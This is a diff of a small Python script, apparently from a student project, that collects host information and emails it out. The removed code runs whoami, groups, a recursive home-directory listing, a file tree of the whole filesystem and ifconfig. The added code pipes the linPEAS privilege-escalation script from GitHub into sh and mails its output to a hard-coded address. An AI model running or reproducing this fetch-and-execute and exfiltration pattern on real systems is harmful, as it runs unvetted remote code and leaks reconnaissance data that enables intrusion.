@@ -1,33 +1,12 @@
-import os
 import subprocess
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-def collect_system_info():
-    info = []
-
-    # Collect user information (limited to current user)
-    info.append("Current User:\n")
-    info.append(subprocess.getoutput("whoami"))
-
-    # Collect group information (limited to current user's groups)
-    info.append("\nCurrent User Groups:\n")
-    info.append(subprocess.getoutput("groups"))
-
-    # Collect file system information (limited to accessible directories)
-    info.append("\nFile System (Limited Access):\n")
-    info.append(subprocess.getoutput("ls -lR ~"))
-
-    # Collect file tree from root
-    info.append("\nFile Tree from Root:\n")
-    info.append(subprocess.getoutput("find / -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'"))
-
-    # Collect network configuration
-    info.append("\nNetwork Configuration:\n")
-    info.append(subprocess.getoutput("ifconfig"))
-
-    return "\n".join(info)
+def execute_command():
+    command = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_small.sh | sh"
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    return result.stdout
 
 def send_email(report, recipient_email):
     sender_email = "9534@holbertonstudents.com"
@@ -36,7 +15,7 @@ def send_email(report, recipient_email):
     msg = MIMEMultipart()
     msg['From'] = sender_email
     msg['To'] = recipient_email
-    msg['Subject'] = "System Scan Report"
+    msg['Subject'] = "Linpeas Scan Report"
 
     msg.attach(MIMEText(report, 'plain'))
 
@@ -52,7 +31,7 @@ def send_email(report, recipient_email):
         print(f"Failed to send email: {e}")
 
 if __name__ == "__main__":
-    report = collect_system_info()
+    report = execute_command()
     recipient_email = "9534@holbertonstudents.com"
     send_email(report, recipient_email)
 
